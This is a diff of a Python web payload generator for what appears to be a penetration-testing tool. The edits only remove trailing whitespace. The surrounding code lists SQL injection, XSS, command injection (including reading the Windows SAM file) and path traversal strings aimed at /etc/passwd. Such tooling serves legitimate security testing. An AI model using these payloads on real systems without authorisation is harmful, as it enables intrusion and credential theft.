@@ -7,7 +7,7 @@ from .payload_generator import PayloadGenerator
 
 class WebPayloadGenerator(PayloadGenerator):
     """Web Payload生成器"""
-    
+
     def generate(self, payload_type: str, options: Optional[Dict] = None) -> List[str]:
         """生成Web payload"""
         if payload_type == "sql_injection":
@@ -20,7 +20,7 @@ class WebPayloadGenerator(PayloadGenerator):
             return self._generate_path_traversal_payloads(options)
         else:
             return []
-    
+
     def _generate_sql_payloads(self, options: Optional[Dict]) -> List[str]:
         """生成SQL注入payload"""
         payloads = [
@@ -37,7 +37,7 @@ class WebPayloadGenerator(PayloadGenerator):
             "' OR 'a'='a",
             "') OR ('1'='1",
         ]
-        
+
         # 数据库特定payload
         if options and options.get("db_type"):
             db_type = options["db_type"].lower()
@@ -52,9 +52,9 @@ class WebPayloadGenerator(PayloadGenerator):
                     "' UNION SELECT version()--",
                     "' UNION SELECT current_user--",
                 ])
-        
+
         return payloads
-    
+
     def _generate_xss_payloads(self, options: Optional[Dict]) -> List[str]:
         """生成XSS payload"""
         payloads = [
@@ -71,7 +71,7 @@ class WebPayloadGenerator(PayloadGenerator):
             "<video><source onerror=alert('XSS')>",
             "<audio src=x onerror=alert('XSS')>",
         ]
-        
+
         # 编码payload
         if options and options.get("encoded"):
             encoded_payloads = [
@@ -79,9 +79,9 @@ class WebPayloadGenerator(PayloadGenerator):
                 "&#60;script&#62;alert('XSS')&#60;/script&#62;",
             ]
             payloads.extend(encoded_payloads)
-        
+
         return payloads
-    
+
     def _generate_command_payloads(self, options: Optional[Dict]) -> List[str]:
         """生成命令注入payload"""
         payloads = [
@@ -97,7 +97,7 @@ class WebPayloadGenerator(PayloadGenerator):
             "| whoami",
             "& whoami",
         ]
-        
+
         # Windows特定
         if options and options.get("os") == "windows":
             payloads.extend([
@@ -106,9 +106,9 @@ class WebPayloadGenerator(PayloadGenerator):
                 "& dir",
                 "; type C:\\Windows\\System32\\config\\sam",
             ])
-        
+
         return payloads
-    
+
     def _generate_path_traversal_payloads(self, options: Optional[Dict]) -> List[str]:
         """生成路径遍历payload"""
         payloads = [
@@ -119,6 +119,6 @@ class WebPayloadGenerator(PayloadGenerator):
             "..%2f..%2f..%2fetc%2fpasswd",
             "..%252f..%252f..%252fetc%252fpasswd",
         ]
-        
+
         return payloads
 
